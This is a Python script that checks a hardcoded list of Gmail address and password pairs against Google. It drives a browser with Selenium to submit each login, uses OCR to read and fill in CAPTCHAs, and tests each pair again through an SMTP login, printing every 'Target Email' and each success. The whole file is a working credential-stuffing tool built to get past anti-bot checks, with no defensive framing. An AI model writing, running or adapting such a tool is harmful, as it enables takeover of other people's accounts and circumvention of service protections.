import smtplib
from smtplib import SMTPAuthenticationError
from concurrent.futures import ProcessPoolExecutor
import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time
import pytesseract
from PIL import Image
import numpy as np
import cv2
from io import BytesIO

email_list = [
    "joshuaturner@gmail.com|b6:1Nf,y-5Jd",
    "noahp@gmail.com|r2jKcX:m:(%7",
    "jamesr@gmail.com|Mp3:kBj8&S0w",
    "kevinturner@gmail.com|17?T1q&d1kiU",
    "vincent_anderson@gmail.com|wk?D6O<U9W}r",
    "bward@gmail.com|I}CyPIdyL7I,",
    "mark.evans@gmail.com|0$Y<LOE3k((T",
    "bryanpatel@gmail.com|i9rV4__!S(S6",
    "william.morgan@gmail.com|8K?,eMCW?jh&",
    "richard.mendoza@gmail.com|G&54>C*0x&E]"
]

driver = webdriver.Chrome()

def solve_captcha(driver):
    captcha_element = driver.find_element(By.CLASS_NAME, 'captcha-image-class')  # Update with the actual class name
    location = captcha_element.location
    size = captcha_element.size
    screenshot = driver.get_screenshot_as_png()
    img = Image.open(BytesIO(screenshot))
    captcha_img = img.crop((location['x'], location['y'], location['x'] + size['width'], location['y'] + size['height']))

    captcha_img = captcha_img.convert('L')
    captcha_img = np.array(captcha_img)
    captcha_img = cv2.threshold(captcha_img, 128, 255, cv2.THRESH_BINARY | cv2.THRESH_OTSU)[1]

    captcha_text = pytesseract.image_to_string(captcha_img, config='--psm 8')

    return captcha_text

def login_with_captcha(email, password, driver):
    driver.get('https://accounts.google.com/ServiceLogin')
    time.sleep(2)

    email_field = driver.find_element(By.ID, 'identifierId')
    email_field.send_keys(email)
    email_field.send_keys(Keys.RETURN)
    time.sleep(2)

    password_field = driver.find_element(By.NAME, 'password')
    password_field.send_keys(password)
    password_field.send_keys(Keys.RETURN)
    time.sleep(2)

    try:
        captcha_text = solve_captcha(driver)
        print(f'Solved Captcha: {captcha_text}')
        captcha_field = driver.find_element(By.ID, 'captcha-field-id')  # Update with the actual field ID
        captcha_field.send_keys(captcha_text)
        captcha_field.send_keys(Keys.RETURN)
    except Exception as e:
        print(f'No captcha or error solving captcha: {e}')

def process_email(email_info):
    email, password = email_info.split('|')
    print(f'Target Email: {email}, Password: {password}')

    try:
        login_with_captcha(email, password, driver)

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.ehlo()
        server.login(email, password)
        print(f'Successfully logged in to {email}')
    except SMTPAuthenticationError as e:
        print(f"Error Authenticating for {email}! {e}")
    finally:
        server.quit()

if __name__ == "__main__":
    with ProcessPoolExecutor(max_workers=os.cpu_count()) as executor:
        executor.map(process_email, email_list)
